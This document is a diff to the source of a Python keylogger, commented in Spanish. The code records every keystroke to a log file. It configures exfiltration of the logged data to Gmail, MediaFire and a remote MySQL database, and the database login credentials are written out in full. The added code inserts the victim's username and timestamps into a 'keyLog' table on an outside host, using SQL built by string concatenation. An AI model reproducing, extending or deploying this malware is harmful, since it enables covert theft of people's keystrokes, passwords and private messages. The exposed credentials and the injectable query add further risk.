@@ -148,9 +148,11 @@ def KeyLogger():
             # Caracteres Especiales
             "'@'": "@",                     # @
             "'#'": "#",                     # #
-            "'*'": "*",                     #
+            "'*'": "*",                     # *
             "'('": "(",                     # (
             "')'": ")",                     # )
+            '"\'"': "'",                    # '
+            "'\"'": '"',                    # "
             "'?'": "?",                     # ?
             "'='": "=",                     # =
             "'+'": "+",                     # +
@@ -244,6 +246,7 @@ def KeyLogger():
     
     def on_press(key):
         with open(log, "a") as f:
+            print(str(key))
             if (len(str(key))) <= 3:
                 print("Se oprimio la tecla: "+KeyConMin(str(key))) 
                 f.write(KeyConMin(str(key)))
@@ -392,56 +395,65 @@ def ReceiveE():
 
 # ************ Fin Zona Gmail ************* 
 
-# ************ Zona MediaFire ************* 
-# Se usará el API de Mediafire para subir el archivo reg.k(registro de teclas)
-def MFUser():
-    return "23Roqew@gmail.com"
+# ************ Start Zone DATABASE ************* 
 
-def MFPass():
-    return "###ertwqerwq"
+def DB_HOST():
+    return "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"                # Host
+def DB_USER():
+    return "udwlsyrbtldkznqo"              # Usuario de la base de datos
+def DB_PASS():
+    return "OR2i2dfdgWek0UDiAv4f"              # Contraseña de la Base de Datos
+def DB_NAME():
+    return "bh1g5gnxzw2igrvui8hq"   # Nombre de Base de datos
+def DB_PORT(): 
+    return "3306"    # Opcional en algunos casos
 
-# ************ Zona MediaFire ************* 
 
 
+# ************ Fin Zone DATABASE ************* 
 
 def timeSend(): # Tiempo de envío perzonalizado
     return 1 #Minutos                 <= Escoja su tiempo en minutos
 
+# ************ Zona MediaFire *************     
+# Se usará el API de Mediafire para subir el archivo reg.k(registro de teclas)
+#def MFUser():
+#    return "corroe@gmail.com"                   # Proximas actualizaciones...
+
+#def MFPass():
+#    return "contra"
+
+# ************ Zona MediaFire ************* 
+
 # ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
 
 def SendDataBaseMySQL():
-    import pymysql
-    DB_HOST = "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"                # Host
-    DB_USER = "udwlsyrbtldkznqo"              # Usuario de la base de datos
-    DB_PASS = "OR2i2dfdgWek0UDiAv4f"              # Contraseña de la Base de Datos
-    DB_NAME = "bh1g5gnxzw2igrvui8hq"   # Nombre de Base de datos
-    DB_PORT = "3306"    # Opcional en algunos casos
-    DB_CONEX = ""
-
-    try:
+    import pymysql  # Lib connection mysql
+    try:    # Verifica si se inició corectamente
         connection = pymysql.connect(
-        host= DB_HOST, 
-        user = DB_USER, 
-        password = DB_PASS, 
-        database = DB_NAME)
-
-        cursor = connection.cursor()
-
+        host= DB_HOST(), 
+        user = DB_USER(), 
+        password = DB_PASS(), 
+        database = DB_NAME())
+        cursor = connection.cursor()    # Objeto cursor
         print("Se inició correctamente [DataBase]")
     except:
         print("Error al iniciar sesión [DataBase]")
 
-    def UpdateUser(id,name):
-
-        sql = "Update NameTabla SET key = '{}'WHERE id={}".format(name, id)
+    def UpdateUser():
+        T = datetime.datetime.now()
+        currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
+        sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES('"+str(getuser())+"','"+currentTime+"','Datos nuevos')"    # Inserta nuevos datos 
+        #sql = "Update NameTabla SET key = '{}'WHERE id={}".format(name, id)
         try:
-            cursor.execute(sql)
-            connection.commit()
+            cursor.execute(sql) # Ejecuta virtual
+            connection.commit() # Se guardan virtual 
+            print("[Database] Se subieron los datos correctamente")
         except:
-            print("Error al obtener")
+            print("[Database] Error al subir los datos")
             pass
         
-    UpdateUser(1,"dsf")
+    #UpdateUser()
 
 
 
@@ -457,7 +469,6 @@ def SendDataBaseMySQL():
 
     # API client does not know about the token
     # until explicitly told about it:
-
 
 # Inicio multihilo
 if __name__ == '__main__':
